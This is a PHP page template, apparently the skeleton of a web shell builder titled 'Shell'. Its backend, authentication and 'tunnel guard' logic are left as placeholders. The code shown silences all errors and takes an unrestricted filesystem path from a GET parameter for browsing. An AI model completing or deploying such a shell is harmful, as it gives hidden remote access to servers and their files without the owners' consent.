<?php
/* Build: {{BUILD_SHORT_ID}} | SHA256: {{BUILD_HASH}} | {{BUILD_TIMESTAMP}} */
error_reporting(0);
ini_set('display_errors', 0);
ob_start();

{{TUNNEL_GUARD}}

{{AUTH_BLOCK}}

{{BACKEND}}

$dir = $_GET['dir'] ?? './';
if (!is_dir($dir)) $dir = './';
$dir = realpath($dir) ?: $dir;
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shell</title>
<style>
{{CSS}}
</style>
</head>
<body>

{{HTML_BODY}}

<script>
const __BUILD = {{BUILD_META_JSON}};
{{JS}}
</script>
</body>
</html>
